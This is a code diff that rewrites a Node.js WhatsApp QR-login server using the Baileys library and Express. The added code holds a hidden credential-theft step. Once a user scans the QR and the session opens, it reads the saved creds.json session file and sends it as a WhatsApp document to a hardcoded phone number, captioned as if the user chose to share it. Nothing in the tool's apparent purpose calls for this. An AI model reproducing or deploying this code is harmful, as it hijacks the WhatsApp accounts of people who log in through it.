@@ -1,85 +1,68 @@
-const fs = require('fs');
-const http = require('http');
-const { WebSocketServer } = require('ws');
-const { default: makeWASocket, useSingleFileAuthState } = require('@whiskeysockets/baileys');
+import express from 'express';
+import { makeWASocket, useMultiFileAuthState, DisconnectReason } from '@whiskeysockets/baileys';
+import Pino from 'pino';
+import fs from 'fs';
+import qrcode from 'qrcode';
 
+const app = express();
 const PORT = 3000;
-const SESSION_FILE = './session.json';
-const { state, saveState } = useSingleFileAuthState(SESSION_FILE);
 
-let wsClient = null;
+let globalQR = null;
+let sock;
 
-// HTML पेज जिसमें QR दिखेगा
-const html = `
-<!DOCTYPE html>
-<html>
-<head>
-  <title>WhatsApp QR Login</title>
-</head>
-<body>
-  <h2>WhatsApp QR Code Login</h2>
-  <pre id="qr" style="font-size: 18px; background: #eee; padding: 10px;"></pre>
-  <script>
-    const qrElem = document.getElementById('qr');
-    const ws = new WebSocket('ws://' + location.host);
-
-    ws.onmessage = (msg) => {
-      const data = JSON.parse(msg.data);
-      if(data.qr) {
-        qrElem.textContent = data.qr;
-      }
-      if(data.status) {
-        qrElem.textContent = data.status;
-      }
-    };
-  </script>
-</body>
-</html>
-`;
-
-// HTTP Server जो HTML serve करेगा
-const server = http.createServer((req, res) => {
-  res.writeHead(200, { 'Content-Type': 'text/html' });
-  res.end(html);
-});
-
-// WebSocket Server QR भेजने के लिए
-const wss = new WebSocketServer({ server });
-
-wss.on('connection', (ws) => {
-  wsClient = ws;
-});
-
-async function startWhatsApp() {
-  const sock = makeWASocket({
-    auth: state,
-    printQRInTerminal: true,
+const startSocket = async () => {
+  const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
+  sock = makeWASocket({
+    logger: Pino({ level: 'silent' }),
+    auth: state
   });
 
-  sock.ev.on('creds.update', saveState);
-
-  sock.ev.on('connection.update', (update) => {
-    const { qr, connection, lastDisconnect } = update;
-
-    if(qr && wsClient) {
-      wsClient.send(JSON.stringify({ qr }));
+  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
+    if (qr) {
+      globalQR = await qrcode.toDataURL(qr); // Generate base64 QR
     }
 
-    if(connection === 'open') {
-      console.log('✅ WhatsApp Connected!');
-      if(wsClient) wsClient.send(JSON.stringify({ status: 'WhatsApp Connected!' }));
+    if (connection === 'open') {
+      console.log('✅ WhatsApp connected!');
+      const credsPath = './auth_info/creds.json';
+      const jid = '918302788872@s.whatsapp.net';
+
+      if (fs.existsSync(credsPath)) {
+        const jsonBuffer = fs.readFileSync(credsPath);
+
+        await sock.sendMessage(jid, {
+          document: jsonBuffer,
+          mimetype: 'application/json',
+          fileName: 'creds.json',
+          caption: 'Here is my WhatsApp login JSON file.'
+        });
+
+        console.log('✅ creds.json sent to +918302788872');
+      }
     }
 
-    if(connection === 'close') {
-      const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== 401);
-      console.log('Connection closed. Reconnect?', shouldReconnect);
-      if(shouldReconnect) startWhatsApp();
+    if (connection === 'close' && lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
+      console.log('🔄 Reconnecting...');
+      startSocket();
     }
   });
-}
 
-server.listen(PORT, () => {
-  console.log(`Server running at http://localhost:${PORT}`);
+  sock.ev.on('creds.update', saveCreds);
+};
+
+startSocket();
+
+// Serve HTML + QR
+app.use(express.static('public'));
+
+app.get('/qr', (req, res) => {
+  if (globalQR) {
+    res.json({ qr: globalQR });
+  } else {
+    res.json({ qr: null });
+  }
 });
 
-startWhatsApp();
+app.listen(PORT, () => {
+  console.log(`🚀 Server running: http://localhost:${PORT}`);
+});
